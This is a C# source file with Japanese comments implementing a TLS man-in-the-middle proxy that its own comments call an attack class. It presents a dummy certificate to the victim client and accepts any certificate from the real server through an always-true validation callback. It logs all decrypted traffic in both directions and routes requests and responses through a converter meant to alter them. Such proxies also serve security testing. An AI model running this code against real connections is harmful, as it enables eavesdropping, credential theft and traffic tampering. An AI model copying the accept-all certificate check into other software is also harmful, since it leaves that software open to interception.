using System;
using System.IO;
using System.Text;
using System.Threading;

using System.Net;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace capture
{
    /// <summary>
    /// 改ざん処理を実行するクラスのインターフェース
    /// </summary>
    public interface IConverter
    {
        /// <summary>
        /// 受信したリクエストデータを変換する
        /// </summary>
        /// <param name="buff">受信データ</param>
        /// <param name="offset">オフセット</param>
        /// <param name="size">受信サイズ</param>
        /// <returns>改ざん後のデータ</returns>
        byte[] ConvertRequest(byte[] buff, int offset, int size);


        /// <summary>
        /// 受信したレスポンスデータを変換する
        /// </summary>
        /// <param name="buff">受信データ</param>
        /// <param name="offset">オフセット</param>
        /// <param name="size">受信サイズ</param>
        /// <returns>改ざん後のデータ</returns>
        byte[] ConvertResponse(byte[] buff, int offset, int size);
    }



    /// <summary>
    /// 中間者攻撃の処理を実行するクラス
    /// </summary>
    public class Mitm
    {
        /// <summary>
        /// 中間者サーバーが利用するダミー証明書
        /// </summary>
        private X509Certificate2 ServerCert = new X509Certificate2(Configure.CertificateFileName, Configure.CertificateFilePassword);

        /// <summary>
        /// ターゲットと中間者サーバーのコネクション
        /// </summary>
        private MitmConnection TargetConnection { get; set; }

        /// <summary>
        /// 中間者クライアントと本来の接続先サーバーのコネクション
        /// </summary>
        private MitmConnection OriginalServerConncetion { get; set; }

        /// <summary>
        /// 本来の接続先サーバーのホスト名
        /// </summary>
        public string OriginalServerHostName = "";

        /// <summary>
        /// 改ざん処理クラス
        /// </summary>
        public IConverter Converter { get; set; }

        /// <summary>
        /// ターゲットへ転送するまでバッファリングするサイズ
        /// </summary>
        public int MinimumSizeToTarget { get; set; }

        /// <summary>
        /// オリジナルサーバーへ転送するまでバッファリングする最小サイズ
        /// </summary>
        public int MinimumSizeToOriginalServer { get; set; }

        /// <summary>
        /// 受信バッファサイズ
        /// </summary>
        public int ReadBufferSize { get; set; }

        /// <summary>
        /// コンストラクタ
        /// </summary>
        /// <param name="target">中間者サーバーに新たに接続されたクライアント</param>
        public Mitm(TcpClient target)
        {
            // デフォルト値を設定
            MinimumSizeToTarget = 0;
            MinimumSizeToOriginalServer = 0;
            ReadBufferSize = 4096;
            Converter = new MitmNullConverter();

            // ターゲットから接続されたセッションに対するクライアントを指定してコネクションを生成
            TargetConnection = new MitmConnection(target);

            // 本来接続するサーバーに対するクライアントを新規作成してコネクションを生成
            OriginalServerConncetion = new MitmConnection();
        }


        /// <summary>
        /// 中間者攻撃を開始する
        /// </summary>
        /// <param name="originalAddr">本来接続するサーバーのアドレス</param>
        /// <param name="originalPort">本来接続するサーバーのポート</param>
        public void Start(IPAddress originalAddr, ushort originalPort)
        {
            try
            {
                // オリジナルサーバーへ接続
                Log.Info("SSL Client: Connect to " + originalAddr + ":" + originalPort);
                OriginalServerConncetion.Client.Connect(originalAddr, originalPort);
                Log.Info("SSL Client: Connect Success");

                // SSLコネクションを接続
                connectionSsl();

                // 各種ループスレッドを生成
                var serverThread = new Thread(startReadLoopForTarget);
                var clientThread = new Thread(startReadLoopForOriginalServer);
                serverThread.Start();
                clientThread.Start();
            }
            catch(Exception err)
            {
                Log.Error("Start() " + err.Message);
                TargetConnection.Close();
                OriginalServerConncetion.Close();
            }
        }


        /// <summary>
        /// 中間者サーバーと中間者クライアントのSSL接続処理を行う
        /// </summary>
        private void connectionSsl()
        {
            // 中間者サーバーとターゲットのSSL接続を実行
            Log.Info("SSL Server: SSL Auth Start. " + TargetConnection.GetString());
            TargetConnection.Stream = new SslStream(TargetConnection.Client.GetStream());
            TargetConnection.Stream.AuthenticateAsServer(ServerCert);
            Log.Info("SSL Server: SSL Auth OK.");

            // 中間者クライアントと本来接続するサーバーのSSL接続を実行
            Log.Info("SSL Client: SSL Auth Start. " + OriginalServerConncetion.GetString());
            OriginalServerConncetion.Stream = new SslStream(OriginalServerConncetion.Client.GetStream(), false, remoteCertificateValidationCallback);
            OriginalServerConncetion.Stream.AuthenticateAsClient(OriginalServerHostName);
            Log.Info("SSL Client: SSL Auth OK.");

            // コネクション完了をマーク
            TargetConnection.IsAvailable = true;
            OriginalServerConncetion.IsAvailable = true;
        }


        /// <summary>
        /// ターゲットからのデータ受信スレッドの処理
        /// </summary>
        private void startReadLoopForTarget()
        {
            string endpoints = TargetConnection.GetString();
            byte[] rbuff = null;
            int recvd_size = -1;

            using (var buffStream = new MemoryStream())
            {
                try
                {
                    // 受信ループ本体
                    rbuff = new byte[ReadBufferSize];
                    Log.Info("SSL Server: SSL Read Loop Start. " + endpoints);
                    while ((recvd_size = TargetConnection.Stream.Read(rbuff, 0, rbuff.Length)) > 0)
                    {

                        var ori = Encoding.UTF8.GetString(rbuff, 0, recvd_size);
                        Log.Debug("------ from target -------");
                        Log.Debug(ori);
                        Log.Debug("--------------------------");

                        // ストリームバッファへ保存
                        buffStream.Write(rbuff, 0, recvd_size);

                        // ストリームバッファに最低容量以上のデータが蓄積したら転送する
                        if (buffStream.Length >= MinimumSizeToOriginalServer)
                        {
                            // 内部バッファ取得
                            var data = buffStream.ToArray();
                            var datalen = data.Length;

                            // 受信データを改ざんする
                            var repbuff = Converter.ConvertRequest(data, 0, datalen);
                            var str = Encoding.UTF8.GetString(repbuff, 0, repbuff.Length);
                            Log.Debug("------ to Original server -------");
                            Log.Debug(str);
                            Log.Debug("---------------------------------");

                            // 改ざんしたデータを送信する
                            OriginalServerConncetion.Stream.Write(repbuff, 0, repbuff.Length);

                            // バッファクリア
                            buffStream.SetLength(0);
                        }
                        else
                        {
                            // バッファ容量が指定サイズ以下である場合は、次回受信が発生するまで何も転送しない
                        }
                    }

                    // ストリームが閉じられたため、受信ループが解除された
                    Log.Info("SSL Server: SSL Read Loop finish n=" + recvd_size + " " + endpoints);
                }
                catch (Exception err)
                {
                    Log.Error("SSL Server: SSL Read Error " + err.Message + " " + endpoints);
                }
                finally
                {
                    Log.Info("startReadLoopForTarget() finally " + TargetConnection.GetString());
                    TargetConnection.IsAvailable = false;
                    closeIfBothThreadFinished();
                }
            }
        } 
        

        /// <summary>
        /// 本来接続するサーバーからのデータ受信処理
        /// </summary>
        private void startReadLoopForOriginalServer()
        {
            string endpoints = OriginalServerConncetion.GetString();
            byte[] rbuff = null;
            int recvd_size = -1;

            using (var buffStream = new MemoryStream())
            {
                try
                {
                    rbuff = new byte[ReadBufferSize];
                    Log.Info("SSL Client: SSL Read Loop Start. " + endpoints);
                    while ((recvd_size = OriginalServerConncetion.Stream.Read(rbuff, 0, rbuff.Length)) > 0)
                    {
                        var ori = Encoding.UTF8.GetString(rbuff, 0, recvd_size);
                        Log.Debug("------ from original server -------");
                        Log.Debug(ori);
                        Log.Debug("-----------------------------------");

                        // ストリームバッファへ保存
                        buffStream.Write(rbuff, 0, recvd_size);

                        // ストリームバッファに最低容量以上のデータが蓄積したら転送する
                        if (buffStream.Length >= MinimumSizeToTarget)
                        {
                            // 内部バッファ取得
                            var data = buffStream.ToArray();
                            var datalen = data.Length;

                            // 受信データを改ざんする
                            var repbuff = Converter.ConvertResponse(data, 0, datalen);

                            var str = Encoding.UTF8.GetString(repbuff, 0, repbuff.Length);
                            Log.Debug("------ to target -------");
                            Log.Debug(str);
                            Log.Debug("------------------------");

                            // 改ざん後のデータを送信
                            TargetConnection.Stream.Write(repbuff, 0, repbuff.Length);

                            // バッファクリア
                            buffStream.SetLength(0);
                        }
                        else
                        {
                            // バッファ容量が指定サイズ以下である場合は、次回受信が発生するまで何も転送しない
                        }
                    }

                    // ストリームが閉じられたため、受信ループが解除された
                    Log.Info("SSL Client: SSL Read Loop Finish. " + recvd_size + " " + endpoints);
                }
                catch (Exception err)
                {
                    Log.Error("SSL Client: SSL Read Error" + err.Message + " " + endpoints);
                }
                finally
                {
                    Log.Info("startReadLoopForOriginalServer() finally " + OriginalServerConncetion.GetString());
                    OriginalServerConncetion.IsAvailable = false;
                    closeIfBothThreadFinished();
                }
            }
        }


        /// <summary>
        /// SSL Client用のサーバー証明書チェック関数(何もしない)
        /// </summary>
        private static Boolean remoteCertificateValidationCallback(
            Object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }


        /// <summary>
        /// コネクションクローズ処理
        /// 二つの受信スレッドがともに終了したらクローズする
        /// </summary>
        private void closeIfBothThreadFinished()
        {
            if (!TargetConnection.IsAvailable && !OriginalServerConncetion.IsAvailable)
            {
                Log.Info("close() " + TargetConnection.GetString());
                TargetConnection.Close();

                Log.Info("close() " + OriginalServerConncetion.GetString());
                OriginalServerConncetion.Close();
            }
        }
    }



    /// <summary>
    /// コネクション管理
    /// </summary>
    class MitmConnection
    {
        /// <summary>
        /// SSLセッション用のTCP接続
        /// </summary>
        public TcpClient Client { get; set; }

        /// <summary>
        /// SSLセッション
        /// </summary>
        public SslStream Stream { get; set; }

        /// <summary>
        /// コネクションが利用できる状態かどうか
        /// </summary>
        public bool IsAvailable { get; set; }


        /// <summary>
        /// コンストラクタ
        /// </summary>
        public MitmConnection()
        {
            Client = new TcpClient();
            IsAvailable = false;
        }

        /// <summary>
        /// コンストラクタ
        /// </summary>
        /// <param name="c"></param>
        public MitmConnection(TcpClient c)
        {
            Client = c;
        }

        public void Close()
        {
            if(Client != null)
            {
                Client.Close();
            }

            if(Stream != null)
            {
                Stream.Close();
            }
        }

        /// <summary>
        /// ローカルエンドポイントの情報取得
        /// </summary>
        /// <returns></returns>
        public IPEndPoint GetLocalEndPoint()
        {
            var ret = (IPEndPoint)Client.Client.LocalEndPoint;
            return ret;
        }

        /// <summary>
        /// リモートエンドポイントの情報取得
        /// </summary>
        /// <returns></returns>
        public IPEndPoint GetRemoteEndPoint()
        {
            var ret = (IPEndPoint)Client.Client.RemoteEndPoint;
            return ret;
        }

        /// <summary>
        /// 接続情報の文字列を取得
        /// </summary>
        /// <returns></returns>
        public string GetString()
        {
            var str = "src=" + GetRemoteEndPoint() + " dst=" + GetLocalEndPoint();
            return str;
        }
    }
}
